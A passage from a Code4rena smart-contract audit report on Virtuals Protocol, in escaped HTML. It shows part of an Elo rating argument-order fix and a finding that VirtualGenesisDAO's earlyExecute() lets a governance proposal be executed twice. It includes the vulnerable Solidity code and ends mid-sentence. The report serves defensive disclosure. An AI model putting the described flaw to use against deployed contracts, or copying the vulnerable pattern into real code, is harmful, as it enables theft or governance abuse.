class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eratingChange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eratingA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eratingB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003escore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekFactor\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epure\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enegative\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps-20\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-20\" aria-label=\"recommended mitigation steps 20 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"95\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e- \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eElo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eratingChange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eresult\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ek\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e+ \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eElo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eratingChange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eresult\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ek\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-17-virtualgenesisdaosolearlyexecute-proposals-can-be-executed-two-times\" style=\"position:relative;\"\u003e\u003ca href=\"#m-17-virtualgenesisdaosolearlyexecute-proposals-can-be-executed-two-times\" aria-label=\"m 17 virtualgenesisdaosolearlyexecute proposals can be executed two times permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-90\"\u003e[M-17] \u003ccode\u003eVirtualGenesisDAO.sol:earlyExecute()\u003c/code\u003e proposals can be executed two times\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-595\"\u003eFitro\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/governance/VirtualGenesisDAO.sol#L95-L118\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/governance/VirtualGenesisDAO.sol#L95-L118\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-4\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-4\" aria-label=\"finding description and impact 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eearlyExecute()\u003c/code\u003e allows a proposal to be executed earlier but can only be called by an account with the \u003ccode\u003eEXECUTOR_ROLE\u003c/code\u003e.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"96\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eearlyExecute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epayable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyRole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eEXECUTOR_ROLE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edescriptionHash\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ) = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eproposalDetails\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003estate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eActive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_voteSucceeded\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_quorumReached\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                !\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_earlyExecutions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e],\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Proposal not ready for early execution\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// avoid reentrancy\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_earlyExecutions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_executeOperations\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edescriptionHash\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eProposalExecuted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAs you can see, it uses the \u003ccode\u003e_earlyExecutions\u003c/code\u003e mapping to prevent the proposal from being executed a second time. The problem is that \u003ccode\u003e_executeOperations()\u003c/code\u003e does not set the \u003ccode\u003eexecuted\u003c/code\u003e flag to \u003ccode\u003etrue\u003c/code\u003e, as can be seen in the \u003ca href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/08566bfe0d19384af30a70815251fa913a19678b/contracts/governance/Governor.sol#L431-L433\"\u003ecomments\u003c/a\u003e of the function.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"97\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e/**\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e* NOTE: Calling this function directly will NOT check the current state of the proposal, set the executed flag to\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e* true or emit the \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`ProposalExecuted`\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e event. Executing a proposal should be done using {execute} or {_execute}.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e*/\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_executeOperations\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/* proposalId */\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/*descriptionHash*/\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; ++\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esuccess\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereturndata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecall\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e{value: \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]}(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003everifyCallResult\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esuccess\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereturndata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis is problematic because a user can call \u003ca 